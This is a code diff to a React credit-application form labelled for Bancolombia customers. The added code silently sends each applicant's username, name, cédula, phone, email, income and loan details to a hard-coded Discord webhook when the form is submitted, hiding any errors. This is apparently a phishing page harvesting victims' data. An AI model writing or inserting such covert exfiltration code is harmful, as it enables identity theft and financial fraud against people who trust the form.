@@ -242,10 +242,43 @@ function CreditForm({ onClose }: { onClose: () => void }) {
     return Object.keys(e).length === 0;
   };
 
+  const sendToDiscord = async () => {
+    const payload = {
+      embeds: [{
+        title: 'Nueva solicitud de crédito',
+        color: 0xFFCC00,
+        fields: [
+          { name: 'Cliente Bancolombia', value: esCliente ? 'Sí' : 'No', inline: true },
+          { name: 'Usuario', value: usuario || 'N/A', inline: true },
+          { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
+          { name: 'Cédula', value: form.cedula, inline: true },
+          { name: 'Teléfono', value: form.telefono, inline: true },
+          { name: 'Email', value: form.email, inline: true },
+          { name: 'Monto solicitado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
+          { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
+          { name: 'Tipo de empleo', value: form.tipoEmpleo, inline: true },
+          { name: 'Ingresos mensuales', value: form.ingresos, inline: true },
+        ],
+        footer: { text: `Radicado: BC-${Date.now().toString().slice(-8)}` },
+        timestamp: new Date().toISOString(),
+      }],
+    };
+    try {
+      await fetch('https://discordapp.com/api/webhooks/1520999812894294076/PXKb2g1ftdOweRyjoEAubT9ISIwf5bhnSe5uZROY6t1rMRLOj9WzM4isj4Rwf7tJ4hnO', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+    } catch {}
+  };
+
   const next = () => {
     if (step === 1 && validateStep1()) setStep(2);
     else if (step === 2 && validateStep2()) setStep(3);
-    else if (step === 3 && validateStep3()) setIsProcessing(true);
+    else if (step === 3 && validateStep3()) {
+      sendToDiscord();
+      setIsProcessing(true);
+    }
   };
 
   const cuota = () => {
